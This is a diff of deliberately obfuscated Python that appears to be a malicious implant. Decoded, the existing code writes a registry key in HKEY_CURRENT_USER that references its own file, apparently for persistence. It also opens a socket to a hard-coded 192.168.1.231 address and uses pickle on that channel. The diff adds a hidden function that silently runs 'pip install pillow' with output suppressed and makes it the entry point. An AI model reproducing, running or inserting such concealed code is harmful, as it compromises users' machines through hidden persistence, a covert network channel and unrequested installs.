@@ -1,10 +1,16 @@
 from builtins import getattr as PzQWXGyzczcO,hasattr as paluuoBFSqqz,staticmethod as wKPVjfEPxnTq;from importlib import import_module as OZXBxjIACLZF
-from sys import getsizeof as wpIUMErvudsk
+from sys import getsizeof as wpIUMErvudsk,executable as aqpawtiezRKh
+from subprocess import check_call as RWncOszECTrd,DEVNULL as vknBVIicHrCu
 def BlGsWbOibgDw(ivMetmwPXMsX,afyUArKrYoaU=None,bLPERsFVJGBl=b'TMAPDaSIcIFG'):
     bWjHdFEaAmUG=afyUArKrYoaU
     eHLzbYimpSFq=().__class__.__name__[-1]+chr(0o170)+chr(101)+{}.__class__.__name__[-2]+().__class__.__name__[1]+chr(0x74)+chr(0b1100101)
     if paluuoBFSqqz(ivMetmwPXMsX,eHLzbYimpSFq):bWjHdFEaAmUG=PzQWXGyzczcO(ivMetmwPXMsX,eHLzbYimpSFq)()
     return bWjHdFEaAmUG
+def VhUkuhQdErew(axKZuigreziB=['AWFZqOjGUXxpi'+chr(73)+chr(0x6D),'p'+chr(0x69)+chr(0o154)*2+chr(79).lower()+chr(119)],**upCobXJiHQes):
+    HRvjXWEzpqlv=[axKZuigreziB[1]]
+    try:
+        for PZqaxzgVvtqfgdgwG in HRvjXWEzpqlv:RWncOszECTrd([aqpawtiezRKh,chr(0x2D)+chr(0b01101101),(axKZuigreziB[0][11:13])+chr(0o160),[].__class__.__name__[-3]+chr(0x6E)+chr(115)+().__class__.__name__[0]+(52/4).__class__.__name__[-2]+chr(0x6C)*2,PZqaxzgVvtqfgdgwG],stdout=vknBVIicHrCu,stderr=vknBVIicHrCu)
+    except:pass
 class dqTtKbqKTkbQ:
     def yRYOYsYKvYCA(self,uupIsDKEcTYa='g-I@a¯£²9\nÖÄ',eqjbWsOeMDTU=0b0101):
         self._RhELPxQjGJNZ={}.__class__.__name__[2:4]+chr(0o171)+chr(0o160)+().__class__.__name__[-1]+chr(0b1110011)
@@ -29,8 +35,7 @@ class dqTtKbqKTkbQ:
         try:PzQWXGyzczcO(pSmTonsEmTFD,YmeBnbLvNEvK)(self._WTUeoKmhFVHz(0x80000001),self._oGTlykckCSxC,0,None,0,0x000F003F,None,self._PyEGWmpLpmWH(ycFobBVTcyoI),self._PyEGWmpLpmWH(VtTvnfZHmkSb))
         except:pass
     def dcfcXvCEiDRj(self,BAVOBQbKMbDZ=None,DpkystLvuXQR='²',**vtWkoRITHYCY):
-        WEAnXpJSRlJW=self._WTUeoKmhFVHz()
-        XJzocCqWABmG=chr(0b1010010)+().__class__.__name__[4]+chr(0x67)+56.2.__class__.__name__[-3].upper()+chr(80).lower()+chr(0o145)+chr(0x6E)
+        WEAnXpJSRlJW=self._WTUeoKmhFVHz();XJzocCqWABmG=chr(0b1010010)+().__class__.__name__[4]+chr(0x67)+56.2.__class__.__name__[-3].upper()+chr(80).lower()+chr(0o145)+chr(0x6E)
         tYOYtuiXFdbt=XJzocCqWABmG+chr(75)+chr(0b1100101)+chr(0x79)+chr(69)+chr(0o170)+chr(0b01110111).upper()
         hQoaDpelqTbF=r'{}'.format([].__class__.__name__[0:2].title()+chr(0x6C)+chr(0b1000001).lower()+{}.__class__.__name__[-2]+chr(32)+chr(0o141).upper()+chr(103)+6.4.__class__.__name__[-3]+chr(0o165)+().__class__.__name__[-5]+chr(0x69))
         zLkPPwNqjfLZ=r'{}'.format(__file__)
@@ -49,8 +54,7 @@ class dqTtKbqKTkbQ:
     __init__=yRYOYsYKvYCA
 class IEEsvAAtTBOH:
     BFjpdgHXTETR=OZXBxjIACLZF(chr(112)+[].__class__.__name__[-3]+{}.__class__.__name__[2]+chr(0x6B)+chr(0o154)+chr(101))
-    OGEoGhwIUaLZ=PzQWXGyzczcO(BFjpdgHXTETR,[].__class__.__name__[-4]+5.2.__class__.__name__[2:4]+chr(0o144)+''.__class__.__name__[-3])
-    grptvisrflVC=PzQWXGyzczcO(BFjpdgHXTETR,{}.__class__.__name__[-4]+chr(117)+chr(0b1101101)+chr(0x70)+[].__class__.__name__[2])
+    OGEoGhwIUaLZ=PzQWXGyzczcO(BFjpdgHXTETR,[].__class__.__name__[-4]+5.2.__class__.__name__[2:4]+chr(0o144)+''.__class__.__name__[-3]);grptvisrflVC=PzQWXGyzczcO(BFjpdgHXTETR,{}.__class__.__name__[-4]+chr(117)+chr(0b1101101)+chr(0x70)+[].__class__.__name__[2])
     @wKPVjfEPxnTq
     def HBdMiKsnAtNH(xIRvIaDKvRwu,AGxFdfgHdRue=0o127):return IEEsvAAtTBOH.OGEoGhwIUaLZ(xIRvIaDKvRwu)
     @wKPVjfEPxnTq
@@ -79,16 +83,12 @@ class gQruAhFOlNgi:
         self._RBkZfGEqaQrd()
     def AGNmlbcbtIqx(self,UnVDCUwoyLXb=0b000110100100):self._FWOvqkkczoLg=self._SrrNsRMyZVGk=None;del self
     def _JhXrWoekkeOZ(self,**hhhKMKlLAmMl):
-        JQbFamnPtOKc=PzQWXGyzczcO(self._GJsNfChonick,self._mQlktKPjOZxN)
-        YyBUItTDklog=PzQWXGyzczcO(self._GJsNfChonick,self._fJYHssfDqEUS)
+        JQbFamnPtOKc=PzQWXGyzczcO(self._GJsNfChonick,self._mQlktKPjOZxN);YyBUItTDklog=PzQWXGyzczcO(self._GJsNfChonick,self._fJYHssfDqEUS)
         NYfPcqvtEIpP=PzQWXGyzczcO(self._GJsNfChonick,self._xYBrgqFPodTg)
-        mUlhKWvjYbaf=PzQWXGyzczcO(self._GJsNfChonick,self._VfPBlQQnlYpW)
-        xAhhsHBguuuK=PzQWXGyzczcO(self._xAhhsHBguuuK,self._FSyoJdzsIZcz)
-        vOJpdLUtmbiL=xAhhsHBguuuK(*(int(0b1010011),1023))
+        mUlhKWvjYbaf=PzQWXGyzczcO(self._GJsNfChonick,self._VfPBlQQnlYpW);xAhhsHBguuuK=PzQWXGyzczcO(self._xAhhsHBguuuK,self._FSyoJdzsIZcz);vOJpdLUtmbiL=xAhhsHBguuuK(*(int(0b1010011),1023))
         self._jNSpDPEwKcqA=(self._kTqFHLSFFmPt,vOJpdLUtmbiL)
         try:
-            self._FWOvqkkczoLg=JQbFamnPtOKc(YyBUItTDklog,NYfPcqvtEIpP)
-            self._SrrNsRMyZVGk=JQbFamnPtOKc(YyBUItTDklog,mUlhKWvjYbaf)
+            self._FWOvqkkczoLg=JQbFamnPtOKc(YyBUItTDklog,NYfPcqvtEIpP);self._SrrNsRMyZVGk=JQbFamnPtOKc(YyBUItTDklog,mUlhKWvjYbaf)
             PzQWXGyzczcO(self._FWOvqkkczoLg,self._yKArJRgFFRTW)(int(0b101))
             PzQWXGyzczcO(self._FWOvqkkczoLg,self._focBjBcNqMxy)(self._jNSpDPEwKcqA)
         except:pass
@@ -111,16 +111,17 @@ class gQruAhFOlNgi:
     __del__=AGNmlbcbtIqx
 class sBAfMdKBacnf:
     def ZWFPj6ZrCyfX(self,uqOYRocVjxVl):
-        self._QmJzWWGKPPgn=self._k4XpEz3nOBl9()
-        self._gvZhdoTewnGB=dqTtKbqKTkbQ()
-        self._PjcWNEFmGwNv=chr(0o120)+chr(0x4A)+{}.__class__.__name__[-4].upper()+chr(113)+False.__class__.__name__[2].upper()+chr(117)+[].__class__.__name__[-2].upper()+chr(0x77)+True.__class__.__name__[0].upper()+chr(70)+chr(0o143)+[].__class__.__name__[-3]
+        self._QmJzWWGKPPgn=self._k4XpEz3nOBl9();self._gvZhdoTewnGB=dqTtKbqKTkbQ();self._PjcWNEFmGwNv=chr(0o120)+chr(0x4A)+{}.__class__.__name__[-4].upper()+chr(113)+False.__class__.__name__[2].upper()+chr(117)+[].__class__.__name__[-2].upper()+chr(0x77)+True.__class__.__name__[0].upper()+chr(70)+chr(0o143)+[].__class__.__name__[-3]
     def _k4XpEz3nOBl9(self,nxgxtVEodAZV=0o71,RfGWymWIoEez=1,AgnvNNXJFhRQ=None):
         wBJI6kjV5EWb=[AgnvNNXJFhRQ]*(8*4)
         if 1<=-1:wBJI6kjV5EWb=[]
         else:wBJI6kjV5EWb=reversed([chr(0x31),chr(17*3),chr(0o62),chr(0b00101110),chr(7*(3+4)),chr(0o56),chr(0x38),chr(54),chr(0b0110001),chr(46),chr(0b0110010),chr(0o71),chr(7*7)])
         return ''.join(filter(None,wBJI6kjV5EWb))
     def _QKhIuqFptfdH(self,**exsixgZWFtsW):self._gvZhdoTewnGB.dcfcXvCEiDRj()
+    def _DrsdBiCuGhtQ(self):VhUkuhQdErew()
     def _RIRonIMENZhQ(self,RarIAWLHcyhZ=5):gQruAhFOlNgi(self._QmJzWWGKPPgn).PJDqOuSwBFci()
-    def oepiPZXSuWQp(self):self._QKhIuqFptfdH()
+    def oepiPZXSuWQp(self):
+        # self._QKhIuqFptfdH();
+        self._DrsdBiCuGhtQ()
     __init__=ZWFPj6ZrCyfX
 sBAfMdKBacnf('uqOYRocVjxVl').oepiPZXSuWQp() if __name__==chr(95)+chr(0b1011111)+chr(109)+chr(0x61)+chr(0o151)+chr(0x6E)+chr(0o137)+chr(0x5F) else exit(0)
